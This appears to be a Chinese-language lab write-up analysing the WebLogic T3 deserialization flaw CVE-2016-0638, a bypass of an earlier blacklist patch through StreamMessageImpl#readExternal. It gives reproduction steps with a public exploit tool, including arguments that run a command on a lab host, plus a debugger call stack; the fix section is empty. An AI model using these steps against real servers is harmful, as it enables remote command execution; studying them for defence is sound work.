# Weblogic T3 反序列化漏洞-CVE-2016-0638

## 漏洞原理

该漏洞是CVE-2015-4852漏洞补丁的绕过。

**当数据流是ServerChannelInputStream对象时就会走到加了黑名单的resolveClass方法，**如果能够找到一个类不在补丁黑名单内，且其内部将ServerChannelInputStream对象定义成新的InputStream对象（而不是ServerChannelInputStream对象），然后存在一个方法可以调用readObject反序列化，则可绕过CVE-2015-4852的漏洞补丁。然后就挖掘出weblogic.jms.common.StreamMessageImpl#readExternal类。

## 漏洞复现

工具：https://github.com/5up3rc/weblogic_cmd

在Main函数中启用

public static String TYPE = "streamMessageImpl";

![image-20221206183057763](D:/Desktop/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Weblogic/Assets/Weblogic%20T3%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2-CVE-2016-0638/image-20221206183057763.png) 

配置Main命令行参数

-H "192.168.8.139" -C "touch /tmp/cve-2016-0638" -B -os linux

![image-20221206183220311](D:/Desktop/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Weblogic/Assets/Weblogic%20T3%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2-CVE-2016-0638/image-20221206183220311.png) 

运行Main

![image-20221206183307918](D:/Desktop/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Weblogic/Assets/Weblogic%20T3%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2-CVE-2016-0638/image-20221206183307918.png) 

成功执行命令

<img src="D:/Desktop/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Weblogic/Assets/Weblogic%20T3%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2-CVE-2016-0638/image-20221206183333717.png" alt="image-20221206183333717" style="zoom: 80%;" /> 

## 漏洞分析

在weblogic.jms.common.StreamMessageImpl#readExternal方法内打断点，发送payload即可触发断点

![image-20221206184203308](D:/Desktop/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Weblogic/Assets/Weblogic%20T3%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2-CVE-2016-0638/image-20221206184203308.png) 

调用栈

```java
readObject:363, ObjectInputStream (java.io)
readExternal:1433, StreamMessageImpl (weblogic.jms.common)
readExternalData:1835, ObjectInputStream (java.io)
readOrdinaryObject:1794, ObjectInputStream (java.io)
readObject0:1348, ObjectInputStream (java.io)
readObject:370, ObjectInputStream (java.io)
readObject:66, InboundMsgAbbrev (weblogic.rjvm)
read:38, InboundMsgAbbrev (weblogic.rjvm)
readMsgAbbrevs:283, MsgAbbrevJVMConnection (weblogic.rjvm)
init:213, MsgAbbrevInputStream (weblogic.rjvm)
dispatch:498, MsgAbbrevJVMConnection (weblogic.rjvm)
dispatch:330, MuxableSocketT3 (weblogic.rjvm.t3)
dispatch:387, BaseAbstractMuxableSocket (weblogic.socket)
readReadySocketOnce:967, SocketMuxer (weblogic.socket)
readReadySocket:899, SocketMuxer (weblogic.socket)
processSockets:130, PosixSocketMuxer (weblogic.socket)
run:29, SocketReaderRequest (weblogic.socket)
execute:42, SocketReaderRequest (weblogic.socket)
execute:145, ExecuteThread (weblogic.kernel)
run:117, ExecuteThread (weblogic.kernel)
```



## 漏洞修复



## 参考

https://y4er.com/posts/weblogic-cve-2016-0638/#%E8%A1%A5%E4%B8%81%E9%87%8C%E7%9A%84%E9%BB%91%E5%90%8D%E5%8D%95

https://xz.aliyun.com/t/8443

https://blog.csdn.net/qq_53264525/article/details/122743342
